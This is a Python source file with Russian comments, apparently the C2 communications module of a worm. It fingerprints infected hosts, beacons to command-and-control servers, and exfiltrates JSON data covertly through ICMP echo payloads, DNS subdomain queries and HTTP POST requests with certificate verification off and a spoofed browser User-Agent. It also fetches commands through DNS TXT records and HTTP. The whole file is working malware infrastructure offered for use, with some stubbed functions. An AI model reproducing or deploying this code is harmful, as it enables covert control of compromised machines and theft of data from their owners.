import os
import socket
import struct
import time
import random
import json
import base64
from common.utils import get_logger, jitter_sleep
import threading
import queue
import urllib.request
import ssl
import re
import dns.resolver
from typing import List, Dict, Any, Optional, Union, Tuple

# Настройка логирования
logger = get_logger('WormComms')

# Константы
DEFAULT_DNS_SERVER = "8.8.8.8"
DEFAULT_C2_DOMAIN = "example.com"
MAX_RETRIES = 5
RETRY_DELAY = 30  # секунды

class C2Connection:
    """Класс для управления соединением с C2-сервером"""
    
    def __init__(self, c2_servers=None, transport="auto"):
        """
        Инициализация C2-соединения
        
        Args:
            c2_servers: Список доступных C2-серверов (IP или домены)
            transport: Транспортный протокол (icmp, dns, http, https, auto)
        """
        self.c2_servers = c2_servers or ["8.8.8.8", "1.1.1.1"]
        self.active_server = None
        self.transport = transport
        self.connection_id = f"{int(time.time())}-{os.getpid()}-{random.randint(1000, 9999)}"
        self.connected = False
        self.last_beacon_time = 0
        self.message_queue = queue.Queue()  # Очередь исходящих сообщений
        self.send_thread = None
        self.retry_count = 0
        
        # Генерируем уникальный идентификатор агента
        self.agent_id = self._generate_agent_id()
        
        # Определяем доступные транспорты
        self.available_transports = self._detect_available_transports()
        
        logger.info(f"C2Connection initialized with agent_id={self.agent_id}")
        
    def _generate_agent_id(self) -> str:
        """Генерирует уникальный идентификатор агента"""
        try:
            # Получаем MAC-адрес основного интерфейса
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                          for elements in range(0, 8*6, 8)][::-1])
            
            # Добавляем имя хоста
            hostname = socket.gethostname()
            
            # Создаем hash на основе MAC и имени хоста
            import hashlib
            agent_hash = hashlib.md5(f"{mac}:{hostname}".encode()).hexdigest()[:12]
            
            return f"agent-{agent_hash}"
        except:
            # В случае ошибки используем случайный идентификатор
            return f"agent-{random.randint(10000, 99999)}"
    
    def _detect_available_transports(self) -> List[str]:
        """Определяет доступные транспортные протоколы"""
        available = []
        
        # Проверяем ICMP
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.close()
            available.append("icmp")
        except:
            logger.debug("ICMP transport not available (no root/admin privileges)")
        
        # Проверяем DNS
        try:
            dns.resolver.resolve('google.com', 'A')
            available.append("dns")
        except:
            logger.debug("DNS transport not available")
        
        # Проверяем HTTP/HTTPS
        try:
            urllib.request.urlopen('https://www.google.com', timeout=3)
            available.append("https")
        except:
            try:
                urllib.request.urlopen('http://www.google.com', timeout=3)
                available.append("http")
            except:
                logger.debug("HTTP/HTTPS transport not available")
        
        logger.info(f"Available transports: {available}")
        return available
    
    def connect(self) -> bool:
        """Устанавливает соединение с C2-сервером"""
        if self.connected:
            return True
            
        logger.info("Connecting to C2 server...")
        
        # Если выбран auto, выбираем наилучший транспорт
        if self.transport == "auto":
            if not self.available_transports:
                logger.error("No available transports!")
                return False
                
            # Приоритет: https > dns > icmp > http
            if "https" in self.available_transports:
                self.transport = "https"
            elif "dns" in self.available_transports:
                self.transport = "dns"
            elif "icmp" in self.available_transports:
                self.transport = "icmp"
            elif "http" in self.available_transports:
                self.transport = "http"
            else:
                logger.error("No suitable transport found!")
                return False
                
        logger.info(f"Using transport: {self.transport}")
        
        # Проверяем все C2-серверы, пока не найдем активный
        for server in self.c2_servers:
            logger.info(f"Trying C2 server: {server}")
            
            if self._check_server(server):
                self.active_server = server
                self.connected = True
                
                # Отправляем регистрационный beacon
                self._send_registration()
                
                # Запускаем поток отправки сообщений из очереди
                self.send_thread = threading.Thread(target=self._message_sender_thread)
                self.send_thread.daemon = True
                self.send_thread.start()
                
                logger.info(f"Connected to C2 server: {server}")
                self.retry_count = 0
                return True
        
        # Если не удалось подключиться ни к одному серверу
        self.retry_count += 1
        logger.error(f"Failed to connect to any C2 server (retry {self.retry_count}/{MAX_RETRIES})")
        
        if self.retry_count >= MAX_RETRIES:
            logger.warning("Maximum retry count reached. Switching to autonomous mode.")
            # TODO: Реализовать автономный режим без C2
            return False
            
        return False
    
    def _check_server(self, server: str) -> bool:
        """Проверяет доступность C2-сервера"""
        try:
            if self.transport == "icmp":
                # Проверяем через ping
                return self._check_icmp(server)
            elif self.transport == "dns":
                # Проверяем через DNS-запрос
                return self._check_dns(server)
            elif self.transport in ["http", "https"]:
                # Проверяем через HTTP/HTTPS
                return self._check_http(server)
            else:
                logger.error(f"Unknown transport: {self.transport}")
                return False
        except Exception as e:
            logger.error(f"Error checking server {server}: {e}")
            return False
    
    def _check_icmp(self, server: str) -> bool:
        """Проверяет доступность сервера через ICMP (ping)"""
        try:
            response = os.system(f"ping -c 1 -W 2 {server} > /dev/null 2>&1")
            return response == 0
        except:
            return False
    
    def _check_dns(self, server: str) -> bool:
        """Проверяет доступность DNS-сервера"""
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [server]
            resolver.timeout = 2
            resolver.lifetime = 2
            resolver.resolve('google.com', 'A')
            return True
        except:
            return False
    
    def _check_http(self, server: str) -> bool:
        """Проверяет доступность HTTP/HTTPS сервера"""
        protocol = "https" if self.transport == "https" else "http"
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            url = f"{protocol}://{server}/status"
            resp = urllib.request.urlopen(url, timeout=3, context=ctx)
            return resp.getcode() == 200
        except:
            return False
    
    def _send_registration(self):
        """Отправляет регистрационный beacon"""
        registration_data = {
            "type": "registration",
            "agent_id": self.agent_id,
            "connection_id": self.connection_id,
            "timestamp": time.time(),
            "system_info": {
                "hostname": socket.gethostname(),
                "os": os.name,
                "agent_version": "1.0",
                "available_transports": self.available_transports
            }
        }
        
        self.send_data(registration_data)
        logger.info("Registration beacon sent")
    
    def send_data(self, data: Dict) -> bool:
        """Добавляет данные в очередь для отправки на C2"""
        if not self.connected:
            if not self.connect():
                logger.warning("Cannot send data: not connected to C2")
                return False
        
        # Добавляем данные в очередь для отправки
        self.message_queue.put(data)
        return True
    
    def _message_sender_thread(self):
        """Фоновый поток для отправки сообщений из очереди"""
        while True:
            try:
                # Если не подключены, пытаемся восстановить соединение
                if not self.connected:
                    if not self.connect():
                        time.sleep(RETRY_DELAY)
                        continue
                
                # Получаем сообщение из очереди
                try:
                    message = self.message_queue.get(block=True, timeout=30)
                except queue.Empty:
                    # Если нет сообщений, отправляем heartbeat
                    if time.time() - self.last_beacon_time > 60:
                        self._send_heartbeat()
                    continue
                
                # Добавляем служебную информацию
                message["agent_id"] = self.agent_id
                message["timestamp"] = time.time()
                
                # Отправляем сообщение
                success = False
                
                if self.transport == "icmp":
                    success = self._send_via_icmp(message)
                elif self.transport == "dns":
                    success = self._send_via_dns(message)
                elif self.transport in ["http", "https"]:
                    success = self._send_via_http(message)
                
                if success:
                    logger.debug(f"Message sent: {message['type']}")
                    self.message_queue.task_done()
                else:
                    # Если не удалось отправить, возвращаем в очередь
                    self.message_queue.put(message)
                    logger.warning(f"Failed to send message: {message['type']}")
                    
                    # Переподключаемся
                    self.connected = False
                    time.sleep(5)
                
            except Exception as e:
                logger.error(f"Error in message sender thread: {e}", exc_info=True)
                time.sleep(10)
    
    def _send_heartbeat(self):
        """Отправляет heartbeat для поддержания соединения"""
        heartbeat_data = {
            "type": "heartbeat",
            "agent_id": self.agent_id,
            "timestamp": time.time()
        }
        
        sent = False
        if self.transport == "icmp":
            sent = self._send_via_icmp(heartbeat_data)
        elif self.transport == "dns":
            sent = self._send_via_dns(heartbeat_data)
        elif self.transport in ["http", "https"]:
            sent = self._send_via_http(heartbeat_data)
            
        if sent:
            self.last_beacon_time = time.time()
            logger.debug("Heartbeat sent")
        else:
            logger.warning("Failed to send heartbeat, connection may be lost")
            self.connected = False
    
    def _send_via_icmp(self, data: Dict) -> bool:
        """Отправляет данные через ICMP"""
        try:
            # Создаем сокет для ICMP
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            # Сериализуем и сжимаем данные
            json_data = json.dumps(data)
            
            # Кодируем в base64 для безопасной передачи
            b64_data = base64.b64encode(json_data.encode()).decode()
            
            # Разбиваем на фрагменты по 32 байта
            fragments = [b64_data[i:i+32] for i in range(0, len(b64_data), 32)]
            
            # Отправляем каждый фрагмент
            for i, fragment in enumerate(fragments):
                # ICMP Echo Request: Type=8, Code=0
                header = struct.pack('!BBHHH', 8, 0, 0, os.getpid() & 0xFFFF, i)
                
                # Добавляем маркер и данные
                payload = f"AGENTX:{fragment}".encode()
                
                # Считаем контрольную сумму
                checksum = icmp_checksum(header + payload)
                header = struct.pack('!BBHHH', 8, 0, checksum, os.getpid() & 0xFFFF, i)
                
                # Отправляем пакет
                packet = header + payload
                sock.sendto(packet, (self.active_server, 0))
                
                # Небольшая задержка между фрагментами
                time.sleep(0.1)
            
            # Отправляем завершающий пакет
            header = struct.pack('!BBHHH', 8, 0, 0, os.getpid() & 0xFFFF, len(fragments))
            payload = b"AGENTX:END"
            checksum = icmp_checksum(header + payload)
            header = struct.pack('!BBHHH', 8, 0, checksum, os.getpid() & 0xFFFF, len(fragments))
            packet = header + payload
            sock.sendto(packet, (self.active_server, 0))
            
            sock.close()
            return True
            
        except Exception as e:
            logger.error(f"Error sending via ICMP: {e}", exc_info=True)
            return False
    
    def _send_via_dns(self, data: Dict) -> bool:
        """Отправляет данные через DNS-запросы"""
        try:
            # Сериализуем данные
            json_data = json.dumps(data)
            
            # Кодируем в base64
            b64_data = base64.b64encode(json_data.encode()).decode()
            
            # Преобразуем в формат, подходящий для DNS-запросов (только a-z0-9)
            clean_data = re.sub(r'[^a-zA-Z0-9]', '', b64_data)
            
            # Разбиваем на части по 30 символов
            fragments = [clean_data[i:i+30] for i in range(0, len(clean_data), 30)]
            
            # Создаем DNS-запросы
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.active_server]
            
            for i, fragment in enumerate(fragments):
                # Формируем уникальные поддомены для передачи данных
                # Формат: [данные].[порядковый номер].[идентификатор агента].c2.example.com
                query = f"{fragment}.{i}.{self.agent_id}.c2.{DEFAULT_C2_DOMAIN}"
                
                try:
                    # Отправляем запрос
                    resolver.resolve(query, 'A')
                except:
                    # Ошибки игнорируем - важно только отправить запрос
                    pass
                
                # Небольшая задержка между запросами
                time.sleep(0.2)
            
            # Отправляем завершающий запрос
            try:
                query = f"end.{len(fragments)}.{self.agent_id}.c2.{DEFAULT_C2_DOMAIN}"
                resolver.resolve(query, 'A')
            except:
                pass
                
            return True
            
        except Exception as e:
            logger.error(f"Error sending via DNS: {e}", exc_info=True)
            return False
    
    def _send_via_http(self, data: Dict) -> bool:
        """Отправляет данные через HTTP/HTTPS"""
        try:
            # Формируем URL
            protocol = "https" if self.transport == "https" else "http"
            url = f"{protocol}://{self.active_server}/api/report"
            
            # Подготавливаем данные
            json_data = json.dumps(data)
            
            # Создаем запрос
            req = urllib.request.Request(
                url=url,
                data=json_data.encode(),
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0',  # Маскируемся под обычный браузер
                    'X-Agent-ID': self.agent_id
                },
                method='POST'
            )
            
            # Отключаем проверку сертификата
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            # Отправляем запрос
            with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
                if response.getcode() == 200:
                    return True
                else:
                    logger.warning(f"HTTP request failed with status {response.getcode()}")
                    return False
                    
        except Exception as e:
            logger.error(f"Error sending via HTTP: {e}", exc_info=True)
            return False
    
    def receive_commands(self) -> List[Dict]:
        """Получает команды от C2-сервера"""
        if not self.connected:
            if not self.connect():
                return []
                
        try:
            if self.transport == "icmp":
                return self._receive_via_icmp()
            elif self.transport == "dns":
                return self._receive_via_dns()
            elif self.transport in ["http", "https"]:
                return self._receive_via_http()
                
            return []
            
        except Exception as e:
            logger.error(f"Error receiving commands: {e}", exc_info=True)
            return []
    
    def _receive_via_icmp(self) -> List[Dict]:
        """Получает команды через ICMP"""
        # Для ICMP требуется прослушивать пакеты в отдельном потоке
        # В данной реализации возвращаем пустой список, так как
        # ICMP-ответы обрабатываются в отдельном потоке
        return []
    
    def _receive_via_dns(self) -> List[Dict]:
        """Получает команды через DNS"""
        try:
            # Формируем запрос на получение команд
            query = f"cmd.{self.agent_id}.c2.{DEFAULT_C2_DOMAIN}"
            
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.active_server]
            
            try:
                # Отправляем запрос
                answers = resolver.resolve(query, 'TXT')
                
                commands = []
                for rdata in answers:
                    for txt_string in rdata.strings:
                        # Декодируем команду из TXT-записи
                        try:
                            cmd_data = base64.b64decode(txt_string).decode()
                            cmd = json.loads(cmd_data)
                            commands.append(cmd)
                        except:
                            continue
                
                return commands
                
            except:
                return []
                
        except Exception as e:
            logger.error(f"Error receiving via DNS: {e}", exc_info=True)
            return []
    
    def _receive_via_http(self) -> List[Dict]:
        """Получает команды через HTTP/HTTPS"""
        try:
            # Формируем URL
            protocol = "https" if self.transport == "https" else "http"
            url = f"{protocol}://{self.active_server}/api/commands?agent_id={self.agent_id}"
            
            # Создаем запрос
            req = urllib.request.Request(
                url=url,
                headers={
                    'User-Agent': 'Mozilla/5.0',
                    'X-Agent-ID': self.agent_id
                }
            )
            
            # Отключаем проверку сертификата
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            # Отправляем запрос
            with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
                if response.getcode() == 200:
                    # Читаем ответ
                    data = response.read().decode()
                    
                    # Парсим JSON
                    try:
                        response_json = json.loads(data)
                        if isinstance(response_json, dict) and 'commands' in response_json:
                            return response_json['commands']
                        elif isinstance(response_json, list):
                            return response_json
                        else:
                            return []
                    except:
                        return []
                else:
                    return []
                    
        except Exception as e:
            logger.error(f"Error receiving via HTTP: {e}", exc_info=True)
            return []

def icmp_checksum(data):
    """Вычисляет контрольную сумму для ICMP-пакетов"""
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s += (data[i] << 8) + data[i+1]
    if n:
        s += (data[-1] << 8)
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xFFFF
    return s

def icmp_beacon(target_ip="8.8.8.8", interval=60):
    """Отправляет периодические ping-запросы для мониторинга доступности C2.
    """
    while True:
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            # ... код отправки ping ...
        except:
            pass
        finally:
            # Используем jitter для вариации интервала
            jitter_sleep(interval, 0.1)

# Глобальные переменные и функции для общего интерфейса
_c2_connection = None

def establish_c2(c2_servers=None):
    """Устанавливает соединение с C2-сервером"""
    global _c2_connection
    
    if _c2_connection is None:
        _c2_connection = C2Connection(c2_servers=c2_servers)
        
    if _c2_connection.connect():
        return _c2_connection
    else:
        return None

def send_c2_data(data):
    """Отправляет данные на C2-сервер"""
    global _c2_connection
    
    if _c2_connection is None:
        _c2_connection = establish_c2()
        
    if _c2_connection:
        return _c2_connection.send_data(data)
    else:
        logger.warning("Cannot send data: no C2 connection")
        return False

def receive_c2_commands():
    """Получает команды от C2-сервера"""
    global _c2_connection
    
    if _c2_connection is None:
        _c2_connection = establish_c2()
        
    if _c2_connection:
        return _c2_connection.receive_commands()
    else:
        logger.warning("Cannot receive commands: no C2 connection")
        return []
